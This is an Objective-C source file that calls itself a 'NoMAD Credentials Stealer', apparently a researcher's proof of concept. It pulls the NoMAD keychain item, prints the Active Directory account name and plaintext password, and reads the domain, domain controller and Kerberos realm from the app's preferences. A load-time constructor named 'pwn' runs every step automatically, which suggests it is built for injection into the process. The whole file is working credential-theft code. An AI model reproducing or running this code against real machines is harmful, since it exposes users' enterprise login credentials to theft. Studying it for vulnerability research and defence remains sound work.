#import <Foundation/Foundation.h>

#if __has_feature(objc_arc)
  #define DLog(format, ...) CFShow((__bridge CFStringRef)[NSString stringWithFormat:format, ## __VA_ARGS__]);
#else
  #define DLog(format, ...) CFShow([NSString stringWithFormat:format, ## __VA_ARGS__]);
#endif

void get_login(void);
void get_password(void);
void get_config(void);
void logo(void);

void get_login() {
    OSStatus res;
    CFTypeRef configurationRef;

    CFStringRef keyLabel = CFStringCreateWithCString (NULL, "NoMAD", kCFStringEncodingUTF8);
    CFMutableDictionaryRef attrDict = CFDictionaryCreateMutable(NULL, 5, &kCFTypeDictionaryKeyCallBacks, NULL);
    CFDictionaryAddValue(attrDict, kSecAttrLabel, keyLabel);
    CFDictionaryAddValue(attrDict, kSecClass, kSecClassGenericPassword);
    CFDictionaryAddValue(attrDict, kSecReturnAttributes, kCFBooleanTrue);

    res = SecItemCopyMatching(attrDict, (CFTypeRef*)&configurationRef);

    NSDictionary *attrs = (__bridge_transfer NSDictionary *)configurationRef;
    DLog(@"+> AD login -> %@", [attrs objectForKey:@"acct"]);
}

void get_password() {
    OSStatus res;
    CFTypeRef configurationRef;

    CFStringRef keyLabel = CFStringCreateWithCString (NULL, "NoMAD", kCFStringEncodingUTF8);

    CFMutableDictionaryRef attrDict = CFDictionaryCreateMutable(NULL, 5, &kCFTypeDictionaryKeyCallBacks, NULL);
    CFDictionaryAddValue(attrDict, kSecAttrLabel, keyLabel);
    CFDictionaryAddValue(attrDict, kSecClass, kSecClassGenericPassword);
    CFDictionaryAddValue(attrDict, kSecReturnData, kCFBooleanTrue);

    res = SecItemCopyMatching(attrDict, (CFTypeRef*)&configurationRef);
    NSData *resultData = (__bridge_transfer NSData *)configurationRef;

    NSString *configuration = nil;
    configuration = [[NSString alloc] initWithData: resultData encoding: NSUTF8StringEncoding];

    DLog(@"+> AD password -> %@", configuration);
}

void get_config() {
    NSString *defaultsPath = [@"~/Library/Preferences/com.trusourcelabs.NoMAD.plist" stringByExpandingTildeInPath];
    NSDictionary *defaults = [NSDictionary dictionaryWithContentsOfFile:defaultsPath];
    DLog(@"+> Domain -> %@", defaults[@"ADDomain"]);
    DLog(@"+> Domain controller -> %@", defaults[@"ADDomainController"]);
    DLog(@"+> Kerberos realm -> %@", defaults[@"KerberosRealm"]);
}

void logo() {
    DLog(@"");
    DLog(@"+-------------------------------+");
    DLog(@"+   NoMAD Credentials Stealer   +");
    DLog(@"+  by Wojciech Regula (_r3ggi)  +")
    DLog(@"+-------------------------------+");
}

__attribute__((constructor)) static void pwn() {
    
    logo();
    get_config();
    get_login();
    get_password();
    exit(0);
    
}
